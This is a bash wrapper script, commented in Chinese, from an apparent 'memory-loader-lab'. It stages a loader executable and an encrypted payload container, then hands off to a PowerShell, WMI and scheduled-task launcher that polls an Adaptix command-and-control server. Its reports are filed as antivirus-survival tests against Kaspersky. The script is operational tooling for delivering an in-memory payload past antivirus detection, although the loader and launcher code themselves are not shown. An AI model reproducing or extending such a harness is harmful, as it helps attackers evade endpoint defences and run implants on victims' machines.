#!/usr/bin/env bash
set -euo pipefail

# 文件作用：一键启动“DHPL1 profile-only loader + cache.dhpl”上线测试。
#
# 这个脚本复用已验证过的 PowerShell/WMI/计划任务启动与 Adaptix 轮询逻辑：
# - loader 换成 research/memory-loader-lab/build/x64/loader_profile_only_diag.x64.exe；
# - payload 换成 DHPL1 容器 cache.dhpl；
# - Windows 侧文件名仍可叫 cache.dat，因为 loader 只按内容解密验证 DHPL1，不依赖扩展名。
#
# 用法：
#   REPORT=${LAB_BASE}/reports/av_survival/kaspersky/profile-only-loader-xxx \
#   ${REPO_ROOT}/scripts/run-profile-only-loader-test.sh P01_profile_only_diag
#
# 可选变量：
#   LAUNCH_METHOD=wmi|start_process|scheduled_task|cmd_start|powershell_nested
#   KEY_SOURCE=argv|env|file
#   TRANSFER_METHOD=http|ssh_b64
#   LOADER_KEY=CHANGE_ME_MEMORY_LOADER_KEY

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
ROOT=${ROOT:-$(cd -- "$SCRIPT_DIR/.." && pwd)}
LAB="$ROOT/research/memory-loader-lab"
TAG=${1:-profile_only_diag}
TS=$(date +%Y%m%d_%H%M%S)
REPORT=${REPORT:-$ROOT/out/reports/profile-only-loader-${TS}}

mkdir -p "$REPORT"/{artifacts,evidence,matrix}

LOADER_ART=${LOADER_ART:-$REPORT/artifacts/loader_profile_only_diag.x64.exe}
PAYLOAD_ART=${PAYLOAD_ART:-$REPORT/artifacts/cache.dhpl}

if [[ ! -f "$LOADER_ART" ]]; then
  if [[ -f "$LAB/build/x64/loader_profile_only_diag.x64.exe" ]]; then
    cp "$LAB/build/x64/loader_profile_only_diag.x64.exe" "$LOADER_ART"
  else
    echo "[-] missing loader_profile_only_diag.x64.exe; run: make -C $LAB profile-loader-diag" >&2
    exit 2
  fi
fi

if [[ ! -f "$PAYLOAD_ART" ]]; then
  if [[ -f "$LAB/build/x64/cache.dhpl" ]]; then
    cp "$LAB/build/x64/cache.dhpl" "$PAYLOAD_ART"
  else
    echo "[-] missing cache.dhpl; run pack_profile_container.py first" >&2
    exit 2
  fi
fi

{
  echo "PROFILE_ONLY_WRAPPER_TS=$TS"
  echo "ROOT=$ROOT"
  echo "REPORT=$REPORT"
  echo "LOADER_ART=$LOADER_ART"
  echo "PAYLOAD_ART=$PAYLOAD_ART"
  echo "LAUNCH_METHOD=${LAUNCH_METHOD:-start_process}"
  echo "KEY_SOURCE=${KEY_SOURCE:-argv}"
  echo "TRANSFER_METHOD=${TRANSFER_METHOD:-http}"
  sha256sum "$LOADER_ART" "$PAYLOAD_ART"
} | tee "$REPORT/evidence/profile-only-wrapper-${TAG}-${TS}.txt"

export REPORT
export LOADER_ART
export PAYLOAD_ART
export SKIP_LOADER_BUILD=1

"$ROOT/scripts/run-mmpp-powershell-loader-test.sh" "$TAG"

if [[ -f "$REPORT/matrix/powershell-memory-loader-results.tsv" ]]; then
  cp "$REPORT/matrix/powershell-memory-loader-results.tsv" "$REPORT/matrix/profile-only-loader-launch-results.tsv"
fi
